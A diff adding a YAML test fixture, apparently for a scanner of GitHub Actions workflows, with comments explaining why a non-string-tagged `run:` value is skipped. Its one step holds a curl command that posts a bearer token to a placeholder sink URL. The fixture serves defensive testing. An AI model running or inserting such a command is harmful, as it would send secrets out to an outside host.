@@ -1,0 +1,12 @@
+# MUST PASS (rc 0). A `run:` value that is NOT a string scalar carries no bash body. The value
+# here has a custom (non-str) tag, so the composer keeps its TEXT (a curl line) on a node whose tag
+# is not the str tag: only the tag check keeps it from being scanned. An int/bool/null `run:`
+# cannot carry a curl line, so a tag is the one way to exercise the check.
+name: fixture-nonstring-run
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run with a non-string value
+        run: !not-a-string "curl --disable --noproxy '*' -sS -H \"Authorization: Bearer ${FIXTURE_TOKEN}\" \"$SINK_URL\""
